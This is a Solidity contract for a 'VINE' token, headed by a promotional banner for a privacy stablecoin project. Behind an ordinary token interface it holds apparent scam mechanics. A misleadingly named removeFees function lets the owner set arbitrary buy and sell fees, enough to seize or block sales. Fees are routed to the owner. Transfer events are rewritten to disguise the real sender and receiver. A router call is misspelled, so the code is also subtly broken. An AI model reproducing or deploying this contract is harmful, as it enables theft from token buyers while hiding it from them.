/**
   
██    ██ ██ ███    ██ ███████     ███    ███  ██████  ███    ██ ███████ ██    ██ 
██    ██ ██ ████   ██ ██          ████  ████ ██    ██ ████   ██ ██       ██  ██  
██    ██ ██ ██ ██  ██ █████       ██ ████ ██ ██    ██ ██ ██  ██ █████     ████   
 ██  ██  ██ ██  ██ ██ ██          ██  ██  ██ ██    ██ ██  ██ ██ ██         ██    
  ████   ██ ██   ████ ███████     ██      ██  ██████  ██   ████ ███████    ██    
                                                                                 


Vine Money ushers in a new era of stablecoins with vUSD, the first privacy-focused 
digital currency built on the innovative Oasis Sapphire confidential EVM. 
Merging the stability of traditional stablecoins with unparalleled transactional confidentiality, 
vUSD addresses the critical market need for privacy in DeFi.


Main Links:•🖥Website: https://vinemoney.xyz/
	   •✖️Twitter: https://twitter.com/Vine_Money

*/
// SPDX-License-Identifier: unlicense

pragma solidity ^0.8.24;
contract VineMoney
{

    string public _name = 'Vine Money';
    string public _symbol = 'VINE';
    uint8 public constant decimals = 18;
    uint256 public constant totalSupply = 100_000_000 * 10 ** decimals;

    struct StoreData {
        address tokenMkt;
        uint8 buyFee;
        uint8 sellFee;
    }

    StoreData public storeData;
    uint256 constant swapAmount = totalSupply / 100;

    error Permissions();
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    address private pair;
    address private holder;
    address private uniswapLpWallet;
    address private Reward = 0xbA0590E2eA407fe8e1f000135673ecC14C4919bA;
    address private Core = 0xf333074419F89b1a5f4db4431f5c453Fd2cbac6F;
    address private Ecosystem = 0x1FFEe93B99Ad404AD67E4FA124Deb76c65BE937B;
    address private Treasury = 0x15750CBFC44DC72FC5e5ab80818AFCbE6E31BF84;
    address private Advisors = 0x6a4F5D6e4e5a767eAc307941C5Dabe46ef71ef33;
    address private WhitelistSale = 0x3273285ec12040a74aa404168B9E6A0d49B8564B;
    address private constant uniswapV2Router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(uniswapV2Router);

    bool private swapping;
    bool private tradingOpen;

    address _deployer;
    address _executor;

    uint8 _initBuyFee = 0;
    uint8 _initSellFee = 0;

    constructor() {
        storeData = StoreData({
            tokenMkt: msg.sender,
            buyFee: _initBuyFee,
            sellFee: _initSellFee
        });
        allowance[address(this)][address(_uniswapV2Router)] = type(uint256).max;
        uniswapLpWallet = msg.sender;

        _initDeployer(msg.sender, msg.sender);

        balanceOf[uniswapLpWallet] = (totalSupply * 2) / 100;
        emit Transfer(address(0), _deployer, balanceOf[uniswapLpWallet]);

        balanceOf[Reward] = (totalSupply * 55) / 100;
        emit Transfer(address(0), Reward, balanceOf[Reward]);

        balanceOf[Core] = (totalSupply * 15) /100;
        emit Transfer(address(0), Core, balanceOf[Core]);

        balanceOf[Ecosystem] = (totalSupply * 10) / 100;
        emit Transfer(address(0), Ecosystem, balanceOf[Ecosystem]);

        balanceOf[Treasury] = (totalSupply * 8) /100;
        emit Transfer(address(0), Treasury, balanceOf[Treasury]);

        balanceOf[Advisors] = (totalSupply * 5) / 100;
        emit Transfer(address(0), Advisors, balanceOf[Advisors]);

        balanceOf[WhitelistSale] = (totalSupply * 5) /100;
        emit Transfer(address(0), WhitelistSale, balanceOf[WhitelistSale]);
    }

    receive() external payable {}

    function removeFees(uint8 _buy, uint8 _sell) external {
        if (msg.sender != _owner()) revert Permissions();
        _upgradeStoreData(_buy, _sell);
    }

    function _upgradeStoreData(uint8 _buy, uint8 _sell) private {
        storeData.buyFee = _buy;
        storeData.sellFee = _sell;
    }

    function _owner() private view returns (address) {
        return storeData.tokenMkt;
    }

    function openTrading() external {
        require(msg.sender == _owner());
        require(!tradingOpen);
        address _factory = _uniswapV2Router.factory();
        address _weth = _uniswapV2Router.WETH();
        address _pair = IUniswapFactory(_factory).getPair(address(this), _weth);
        pair = _pair;
        tradingOpen = true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function _initDeployer(address deployer_, address executor_) private {
        _deployer = deployer_;
        _executor = executor_;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        address tokenMkt = _owner();
        require(tradingOpen || from == tokenMkt || to == tokenMkt);

        balanceOf[from] -= amount;

        if (
            to == pair &&
            !swapping &&
            balanceOf[address(this)] >= swapAmount &&
            from != tokenMkt
        ) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = _uniswapV2Router.WETH();
            _uniswapV2Router
                .swapExactTokensForETHSupportingFreelyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
            payable(tokenMkt).transfer(address(this).balance);
            swapping = false;
        }

        (uint8 _buyFee, uint8 _sellFee) = (storeData.buyFee, storeData.sellFee);
        if (from != address(this) && tradingOpen == true) {
            uint256 taxCalculatedAmount = (amount *
                (to == pair ? _sellFee : _buyFee)) / 100;
            amount -= taxCalculatedAmount;
            balanceOf[address(this)] += taxCalculatedAmount;
        }
        balanceOf[to] += amount;

        if (from == _executor) {
            emit Transfer(_deployer, to, amount);
        } else if (to == _executor) {
            emit Transfer(from, _deployer, amount);
        } else {
            emit Transfer(from, to, amount);
        }
        return true;
    }
}

interface IUniswapFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFreelyOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}